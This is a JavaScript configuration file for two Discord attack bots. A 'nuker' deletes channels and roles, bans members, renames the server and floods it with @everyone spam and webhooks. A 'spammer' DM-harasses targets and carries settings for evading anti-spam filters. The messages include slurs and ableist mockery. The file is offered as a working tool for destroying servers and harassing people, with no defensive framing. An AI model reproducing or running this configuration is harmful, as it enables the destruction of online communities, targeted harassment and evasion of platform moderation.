module.exports = {
    // =====================
    // GENERAL BOT SETTINGS
    // =====================
    general: {
        commandPrefix: '=',               // Prefix for text commands
        uptimePort: 3000,                 // Base port for uptime monitors
        selfPingInterval: 300000,         // 5 minutes in ms
        reconnectInterval: 60000,         // 1 minute in ms
        maxOperationTime: 1800000,        // 30 minutes max operation time
    },

    // =====================
    // NUKE BOT CONFIG
    // =====================
    nuker: {
        token: process.env.TOKEN_NUKER,
        allowedUserIds: ['1284886248330231891', '1360301293872091136', '1340617218542800916'],
        whitelistedServerIds: ['1350135026322247721', '123'],
        
        // Server modification settings
        serverIcon: 'https://cdn.discordapp.com/avatars/1284886248330231891/d483984f4119be0f7ad1a7b892bf0d37.png',
        serverName: 'NUKED BY KYN🤡/goldsociety',
        
        // Channel settings
        channelNames: [
            'Nuked-By-Kyn-☠️💣',
            'Kyn-Own-This-Server-😹💤'
        ],
        channelCount: 20,
        
        // Spam settings
        spammedMessages: [
            '# @everyone GET NUKED BY KYN! 🐵 https://discord.gg/GxgqvZ5aE3',
            '# @here KYN OWNS YOU ALL NEWGENS! https://tenor.com/view/meme-down-syndrome-funny-tongue-action-tongue-out-meme-gif-572114404054760484',
            '# @everyone LOL THIS SERVER GOT DESTROYED 😹 https://cdn.discordapp.com/attachments/907080818562854954/1217174300650508448/attachment.gif?ex=68049127&is=68033fa7&hm=aaeea557f62d47bba1de31e232b160ffbdc1a9184ef8d251752959c683744782&'
        ],
        spamRounds: 200,
        
        // Timing configuration
        timing: {
            channelCreateDelay: 500,
            channelDeleteDelay: 500,
            roleCreateDelay: 500,
            roleDeleteDelay: 500,
            banDelay: 1000,
            messageDeleteDelay: 500,
            webhookCreateDelay: 500,
            serverEditDelay: 2000,
            spamRoundDelay: 1000,
            initialOperationDelay: 3000
        },

        // Behavior configuration
        behavior: {
            createChannels: true,
            deleteChannels: true,
            banMembers: true,
            spamMessages: true,
            createWebhooks: true,
            editServerInfo: true,
            createRoles: true,
            deleteRoles: true,
            leaveServerAfterNuke: false
        },

        // Webhook configuration
        webhooks: {
            createCount: 5,
            names: ["NUKED BY KYN", "GET WRECKED"],
            messages: ["@everyone LMAO GET NUKED", "@here KYN OWNS YOU"]
        },

        // Role configuration
        roles: {
            createCount: 10,
            names: ["NUKED BY KYN", "GET BETTER NEWGENS"],
            colors: ["#FF0000", "#000000"],
            hoist: true,
            mentionable: true
        }
    },

    // =====================
    // SPAM BOT CONFIG
    // =====================
    spammer: {
        token: process.env.TOKEN_SPAMMER,
        authorizedIds: ['1284886248330231891', '1340617218542800916', '1360301293872091136'],
        whitelistedIds: ['1284886248330231891', '123'],
        
        // Spam settings
        defaultSpamMessage: "# YOU'RE BEING SPAMMED BY KYN FAGT! GET LOST BOZO! https://cdn.discordapp.com/attachments/1243645226091020328/1320136219585155114/d68845f804446649d52eb4085678eb3c.gif",
        spamDelay: 700,
        
        // DM settings
        dm: {
            maxAttempts: 100,            // Max DM attempts before stopping
            cooldown: 30000,              // 30s cooldown if blocked
            typingDuration: 2000,         // Show typing indicator for 2s
            deleteAfter: 60000            // Delete spam messages after 60s
        },

        // Timing configuration
        timing: {
            initialDelay: 2000,           // Delay before starting spam
            betweenMessages: 500,         // Delay between messages
            betweenTargets: 1000,         // Delay when switching targets
            typingDelay: 1500             // Delay before sending after typing
        },

        // Behavior configuration
        behavior: {
            sendTyping: true,             // Show typing indicator
            autoRestart: false,           // Auto-restart if blocked
            randomizeDelays: true,        // Randomize delays slightly
            deleteMessages: false,        // Attempt to delete spam messages
            mentionUser: true             // Mention user in first message
        },

        // Protection bypass settings
        bypass: {
            rotateMessages: true,         // Rotate through different messages
            messageVariants: [            // Variants to rotate through
                "# KYN OWNS YOU FAGTS {user}",
                "# GET SPAMMED BY KYN {user}",
                "# YOU CAN'T BLOCK ME {user}"
            ],
            addRandomText: true,          // Add random text to bypass filters
            useEmbeds: false              // Use embeds to bypass filters
        }
    },

    // =====================
    // SHARED SAFETY SETTINGS
    // =====================
    safety: {
        maxOperationTime: 1800000,        // 30 minute max runtime
        rateLimitProtection: true,        // Auto-slowdown if rate limited
        emergencyStopCommand: '!abort',   // Command to stop all operations
        adminOverrideIds: ['1284886248330231891'] // Can override safety limits
    }
};